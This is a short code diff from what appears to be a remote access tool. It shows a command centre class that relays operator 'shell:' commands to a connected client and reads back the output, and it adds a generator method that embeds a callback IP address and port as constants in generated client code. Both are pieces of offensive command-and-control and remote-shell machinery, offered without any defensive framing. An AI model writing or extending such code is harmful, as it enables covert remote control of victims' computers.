@@ -389,7 +389,7 @@ class COMMCENTER:
                 val = "shell:" + val.rstrip(" ").lstrip(" ")
 
                 if val:
-                    if val != "shell:exit":
+                    if val != "shell:exit":             
                         self.CURRENT[1].send_data(val)
                         result = self.CURRENT[1].recv_data()
                         if result.strip(" "):
@@ -613,6 +613,11 @@ class GENERATOR:
         data = fl.read()
         fl.close()
         return data
+
+    def get_consts(self):
+        data = "CONSTIP = \"%s\"\nCONSTPT = %i" % (self.address, self.port)
+        return data
+    
     
 
 
